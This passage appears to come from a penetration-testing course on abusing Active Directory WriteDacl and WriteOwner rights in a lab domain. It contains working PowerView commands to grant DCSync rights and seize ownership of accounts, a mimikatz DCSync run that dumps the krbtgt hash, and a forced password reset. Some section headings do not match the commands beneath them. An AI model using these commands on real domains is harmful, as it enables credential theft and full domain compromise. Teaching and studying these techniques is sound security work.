In the context of Active Directory, specific permissions, such as `WriteDacl` and `Ownership`, play a crucial role in controlling access to objects and ensuring their security. The `WriteDacl` access right refers to the privilege that allows an account to modify the `DACL` of a target object. `Ownership` on the other hand denotes the state of possessing administrative control over an object. Understanding the significance of these access rights is essential as they can impact the vulnerability and potential abuses associated with the manipulated `DACL`.

Suppose we possess an account with privileges to modify a target object's `DACL` through the `ownership` or `WriteDacl` access rights. In that case, we can use that account to edit the target's `DACL` and make it vulnerable to other attacks.

In the following example, we hijacked an account with `WriteDacl` over the root domain object. We can use this access rights to grant us `DCSync` rights. The domain's `DACL`, if edited, can grant us enough rights to perform a [DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) attack.

## Identifying Vulnerable Objects

We can use `BloodHound` to identify objects vulnerable to `WriteDacl` or with the edge `Owner`. Although we can use the cypher query we used before and replace it with `WriteDacl` or `Owner`, this may create many difficult paths to check. We can use the pathfinding option to identify the paths from the account we have control of to our target:

![luna_writedacl_domain.jpg](https://academy.hackthebox.com/storage/modules/219/luna_writedacl_domain.jpg)

We can also use `PowerView` to identify if `Luna` has Active Directory rights over the domain `INLANEFREIGHT.LOCAL`. To do so, we will use the function `Get-DomainSID` and pass it to the function `Get-DomainObjectAcl`; this is because if we use `-Identity` `inlanefreight.local`, we will get a few more objects due to inheritance issues and the domain name appearing on those objects:


# Querying Luna's DACL over the Domain


```powershell
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> $userSID = ConvertTo-SID luna
PS C:\Tools> Get-DomainSID | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}

AceType               : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : WriteDacl
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1267651629-1192007096-1618970724
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-1267651629-1192007096-1618970724-4618
AccessMask            : 262144
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

We can use `dacledit.py` to find those privileges, but instead of using the `-target` option, we will use `-target-dn` to specify the Domain Distinguished name:

---
---
# Abusing WriteDacl from Windows

On Windows, we can use `PowerView` to modify `DACLs`. We will use [PowerView](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1) or [SharpView](https://github.com/tevora-threat/SharpView) and the `Add-DomainObjectAcl` function with the option `-TargetIdentity $(Get-DomainSID)` to specify the object we want to modify, in this case, we are also querying the domain's SID with the function `Get-DomainSID`, next we need to specify the `-PrincipalIdenity luna` which is the account that we want to grant the rights and finally the option `-Rights DCSync`:

#### Modifying DACLs using PowerView

Granting Rights and Ownership

```powershell-session
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Add-DomainObjectAcl -TargetIdentity $(Get-DomainSID) -PrincipalIdentity luna -Rights DCSync -Verbose

VERBOSE: [Get-DomainSearcher] search base:
LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=luna)(name=luna)(displayname=luna))))
VERBOSE: [Get-DomainSearcher] search base:
LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(objectsid=S-1-5-21-1267651629-1192007096-1618970724)))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Luna,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
'DCSync' on DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Luna,CN=Users,DC=INLANEFREIGHT,DC=LOCAL rights
 GUID '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' on DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Luna,CN=Users,DC=INLANEFREIGHT,DC=LOCAL rights
 GUID '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' on DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Luna,CN=Users,DC=INLANEFREIGHT,DC=LOCAL rights
 GUID '89e95b76-444d-4c62-991a-0facbeda640c' on DC=INLANEFREIGHT,DC=LOCAL
```

To perform `DCSync` from Windows, we can use [mimikatz](https://github.com/gentilkiwi/mimikatz):

#### DCSync from Windows using mimikatz

Granting Rights and Ownership

```cmd-session
C:\Tools> mimikatz.exe "lsadump::dcsync /domain:inlanefreight.local /user:krbtgt /csv"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:inlanefreight.local /user:krbtgt /csv
[DC] 'inlanefreight.local' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt  dafbbaba2fef3addbba5b4fedfc38dab        514
```

---
---
# Grant ownership

We obtained access to an account with the `WriteOwner` access right over a target object. This particular account allows us to modify the `owner` of the target object, specifically the `OwnerSid` sub-attribute within the object's `security descriptor`. Exploiting this `access right` opens up possibilities for various abuses, depending on the target object: if we have `WriteOwner` over a `user` we can assign all rights to another account (which will allow us to perform a `Password Reset` or `targeted Kerberoasting`), if it is a `group` we can add or remove members, and if it is a `GPO` we can modify it.

Note: GPO Attacks as well other DACL abuses (such as computer attacks) will be covered in other DACL Attacks mini-modules.

The `WriteOwner` access right allows us to modify the object's owner; however, when using `dacledit.py` or `PowerView`, these tools will not show us any access rights we can abuse. For example, `Lilia` is the owner of the group `Managers`, if we use `PowerView` or `dacledit.py`, we will not get any result if we look for the object `DACL`:

#### Query Lilia's DACL over Managers with PowerView


```powershell
PS C:\Tools> Get-DomainObjectAcl -Identity Managers -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $LiliaSID}

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=krbtgt)))
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainObjectAcl] Get-DomainObjectAcl filter string: (&(|(|(samAccountName=Managers)(name=Managers)(displayname=Managers))))
```

However, we can use `BloodHound` to detect this relationship:

![lilia_owns_managers_bloodhound.jpg](https://academy.hackthebox.com/storage/modules/219/lilia_owns_managers_bloodhound.jpg)

---
---

# Identifying Vulnerable Objects

Suppose that we successfully gained access to `Pedro`, an account with `WriteOwner` over the user account `GPOADMIN`.

First, we will use `BloodHound` with a cypher query to identify those access rights. We include `n:User` so that `BloodHound` returns only paths created from a user object. We can do the same with groups; however, that will create too many paths, making it more challenging to analyze.

```cypher
MATCH p=((n:User)-[r:WriteOwner]->(m)) RETURN p
```

![writeowner_user.jpg](https://academy.hackthebox.com/storage/modules/219/writeowner_user.jpg)

Similarly, we can use `dacledit.py` and `PowerView` to identify those access rights:

# Querying Pedro's DACL over the User GPOAdmin using dacledit.py

```powershell
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> $userSID = ConvertTo-SID pedro
PS C:\Tools> Get-DomainObjectAcl -Identity GPOAdmin -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}

AceType               : AccessAllowed
ObjectDN              : CN=GPOAdmin,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : WriteOwner
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1267651629-1192007096-1618970724-4624
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-1267651629-1192007096-1618970724-4617
AccessMask            : 524288
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

---
---
# Abusing WriteOwner from Windows

From Windows, we can change a target object's `owner` with [Set-DomainObjectOwner](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObjectOwner/) from the [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1).

#### Setting the Object Owner with PowerView

```powershell-session
PS C:\Tools> Set-DomainObjectOwner -Identity GPOAdmin -OwnerIdentity pedro -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=pedro)(name=pedro)(displayname=pedro))))
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=GPOAdmin)(name=GPOAdmin)(displayname=GPOAdmin))))
VERBOSE: [Set-DomainObjectOwner] Attempting to set the owner for 'GPOAdmin' to 'pedro'
```

To edit another object's `DACL`, we can use the [Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/) function from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1). The `PowerView` `-Rights` option supports `All`, `ResetPassword`, `WriteMembers`, and `DCSync` (notice that `PowerView` uses `All` instead of `FullControl`, but they are identical). Alternatively, we can use the option `-RightsGUID` to manually specify the extended access rights we want to apply:

# Modifying GPOAdmin's DACL

```powershell-session
PS C:\Tools> Add-DomainObjectAcl -TargetIdentity GPOAdmin -PrincipalIdentity pedro -Rights All -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=pedro)(name=pedro)(displayname=pedro))))
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=GPOAdmin)(name=GPOAdmin)(displayname=GPOAdmin))))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Pedro Valt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 'All' on
CN=GPOAdmin,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=Pedro Valt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL rights GUID
'00000000-0000-0000-0000-000000000000' on CN=GPOAdmin,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

Now we can use `net` to perform the password reset.

# Password Reset using net

```cmd
C:\Tools> net user GPOAdmin Tryanotherpassword123 /domain

The command completed successfully.
```

